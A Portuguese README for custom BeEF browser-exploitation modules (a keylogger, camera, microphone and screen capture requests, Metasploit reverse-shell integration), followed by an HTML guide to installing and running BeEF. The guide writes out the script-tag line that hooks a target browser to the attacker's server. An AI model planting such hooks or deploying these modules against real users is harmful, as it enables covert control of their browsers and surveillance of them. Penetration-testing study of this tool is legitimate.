# BeEF Modules Project

## Sobre

Este projeto contém módulos customizados para o BeEF (Browser Exploitation Framework), incluindo:

- Keylogger básico
- Módulo para solicitar permissões do navegador (câmera, microfone, tela)
- Integração com Metasploit
- Exemplos de código e estrutura organizada

## Instalação do BeEF

1. Clone o BeEF do repositório oficial:  
   `git clone https://github.com/beefproject/beef.git`  
2. Instale as dependências:  
   `cd beef && bundle install`  
3. Configure o BeEF no `config.yaml` conforme necessidade.  
4. Inicie o BeEF:  
   `./beef`

## Como usar os módulos

- Copie os arquivos JS da pasta `modules/` para a pasta `extensions/` ou crie novos comandos no painel do BeEF.
- No painel web, ative o módulo desejado no navegador alvo.

## Código de permissão do navegador

O módulo `permission_request.js` solicita ao usuário acesso à câmera, microfone e captura de tela usando as APIs:

- `navigator.mediaDevices.getUserMedia()`
- `navigator.mediaDevices.getDisplayMedia()`

Resultados são enviados ao servidor BeEF para controle e análise.

## Integração com Metasploit

Exemplo de módulo para executar comandos via Metasploit a partir do BeEF e obter shell reverso.

## Atenção

- Use estes módulos apenas para testes autorizados.
- Respeite as leis locais e políticas de segurança.
- Código fornecido como estudo e aprendizado.







<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>BeEF - Browser Exploitation Framework - Guia Completo</title>
<style>
  body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; max-width: 900px; }
  pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
  code { font-family: monospace; }
  h1, h2, h3 { color: #333; }
  a { color: #0077cc; text-decoration: none; }
  a:hover { text-decoration: underline; }
</style>
</head>
<body>

<h1>BeEF - Browser Exploitation Framework</h1>

<h2>Descrição</h2>
<p>
BeEF é uma ferramenta poderosa para testes de penetração focada em explorar vulnerabilidades no navegador web. 
Permite controlar browsers <em>hookados</em> via interface web, executar diversos módulos e realizar pentests focados em ataques do lado cliente.
</p>

<h2>Pré-requisitos</h2>
<ul>
  <li>Linux (Ubuntu, Kali, Debian, etc.) ou macOS</li>
  <li>Ruby (versão 2.7 ou superior recomendada)</li>
  <li>Bundler (gerenciador de dependências Ruby)</li>
  <li>Git</li>
  <li>Node.js e npm (opcional, para alguns módulos)</li>
  <li>Acesso root/sudo para instalação</li>
</ul>

<h2>Passo 1 - Instalar dependências essenciais</h2>
<p>No Ubuntu/Kali, abra o terminal e rode:</p>
<pre><code>sudo apt update
sudo apt install git ruby ruby-dev build-essential libsqlite3-dev zlib1g-dev libxml2 libxslt1-dev libcurl4-openssl-dev libssl-dev
</code></pre>
<p>Para instalar o Bundler:</p>
<pre><code>sudo gem install bundler
</code></pre>

<h2>Passo 2 - Clonar o repositório oficial do BeEF</h2>
<pre><code>git clone https://github.com/beefproject/beef.git
cd beef
</code></pre>

<h2>Passo 3 - Instalar dependências Ruby do BeEF</h2>
<pre><code>bundle install
</code></pre>
<p>Esse comando vai instalar todas as <em>gems</em> necessárias.</p>

<h2>Passo 4 - Configurar o BeEF</h2>
<p>O arquivo principal de configuração é o <code>config.yaml</code> dentro da pasta do BeEF.</p>
<p>Abra o arquivo para edição:</p>
<pre><code>nano config.yaml
</code></pre>
<p>Configure as opções de rede (por padrão, <code>host: "0.0.0.0"</code> para aceitar conexões externas). Você pode definir porta, credenciais (usuário e senha padrão: <code>beef</code>).</p>
<p>Verifique a seção dos módulos para ativar/desativar módulos específicos.</p>

<h2>Passo 5 - Rodar o BeEF</h2>
<p>No terminal, estando na pasta do BeEF, execute:</p>
<pre><code>./beef
</code></pre>
<p>Aguarde o servidor iniciar. No final do boot, verá a URL da interface web, geralmente:</p>
<pre><code>http://127.0.0.1:3000/ui/panel
</code></pre>
<p>Acesse essa URL no navegador.</p>

<h2>Passo 6 - Login na interface web</h2>
<p>Use usuário e senha padrão (configuráveis no <code>config.yaml</code>):</p>
<ul>
  <li>Usuário: <code>beef</code></li>
  <li>Senha: <code>beef</code></li>
</ul>

<h2>Passo 7 - Hookar um navegador alvo</h2>
<p>Para hookar um navegador (que será controlado pelo BeEF), insira o script <code>hook.js</code> da seguinte forma:</p>
<pre><code>&lt;script src="http://&lt;ip-do-seu-beef&gt;:3000/hook.js"&gt;&lt;/script&gt;
</code></pre>
<p>O alvo deve acessar uma página contendo esse script para ficar "hookado". Depois, no painel do BeEF, o navegador aparecerá na lista de "hooked browsers".</p>

<h2>Passo 8 - Usar os módulos do BeEF</h2>
<p>Com o navegador hookado, você pode escolher e executar módulos para testar a segurança do browser.</p>

<h2>Passo 9 - Parar o BeEF</h2>
<p>No terminal, pressione <code>Ctrl+C</code> para parar o servidor BeEF.</p>

<h2>Dicas e recomendações</h2>
<ul>
  <li>Use o BeEF somente em ambientes autorizados e para fins educativos ou pentests legais.</li>
  <li>Atualize o BeEF regularmente com <code>git pull</code> para receber as últimas correções.</li>
  <li>Explore a documentação oficial em <a href="https://github.com/beefproject/beef/wiki" target="_blank" rel="noopener noreferrer">https://github.com/beefproject/beef/wiki</a> para aprender mais.</li>
</ul>

<h2>Script para instalação automática do BeEF</h2>
<p>Salve este script como <code>install_beef.sh</code> e execute para atualizar o sistema, instalar dependências, clonar o repositório e iniciar o BeEF:</p>

<pre><code>#!/bin/bash

echo "=== Atualizando sistema ==="
sudo apt update && sudo apt upgrade -y

echo "=== Instalando dependências ==="
sudo apt install -y git ruby ruby-dev build-essential libsqlite3-dev zlib1g-dev libxml2 libxslt1-dev libcurl4-openssl-dev libssl-dev

echo "=== Instalando Bundler ==="
sudo gem install bundler

echo "=== Clonando o repositório do BeEF ==="
if [ ! -d "beef" ]; then
  git clone https://github.com/beefproject/beef.git
else
  echo "Pasta beef já existe, atualizando..."
  cd beef
  git pull
  cd ..
fi

echo "=== Instalando gems do BeEF ==="
cd beef || exit
bundle install

echo "=== Tornando o BeEF executável ==="
chmod +x beef

echo "=== Instalando concluída! Você pode iniciar o BeEF com: ./beef/beef ==="

echo "=== Iniciando o BeEF ==="
./beef
</code></pre>

<h3>Como usar o script:</h3>
<pre><code>chmod +x install_beef.sh
./install_beef.sh
</code></pre>

<h2>Configuração do BeEF como serviço systemd</h2>
<p>Para rodar o BeEF automaticamente como serviço (exemplo de caminho: <code>/home/bruno/beef</code>), crie o arquivo:</p>
<pre><code>sudo nano /etc/systemd/system/beef.service
</code></pre>
<p>Cole o conteúdo abaixo (ajuste o caminho e usuário):</p>
<pre><code>[Unit]
Description=BeEF Framework Service
After=network.target

[Service]
Type=simple
User=bruno
WorkingDirectory=/home/bruno/beef
ExecStart=/home/bruno/beef/beef
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
</code></pre>

<p>Salve (Ctrl+O, Enter) e saia (Ctrl+X). Depois rode:</p>
<pre><code>sudo systemctl daemon-reload
sudo systemctl enable beef.service
sudo systemctl start beef.service
sudo systemctl status beef.service
</code></pre>

<p>Para parar o serviço:</p>
<pre><code>sudo systemctl stop beef.service
</code></pre>

<p>Logs do BeEF (via systemd journal):</p>
<pre><code>sudo journalctl -u beef.service -f
</code></pre>

<h2>Script para configurar firewall (UFW) para BeEF</h2>
<p>Salve este script como <code>configurar_firewall_beef.sh</code>:</p>

<pre><code>#!/bin/bash

echo "=== Ativando firewall UFW ==="
sudo ufw enable

echo "=== Permitindo porta 3000 (BeEF) ==="
sudo ufw allow 3000/tcp

echo "=== Status do firewall ==="
sudo ufw status verbose
</code></pre>

<p>Use:</p>
<pre><code>chmod +x configurar_firewall_beef.sh
./configurar_firewall_beef.sh
</code></pre>

</body>
</html>

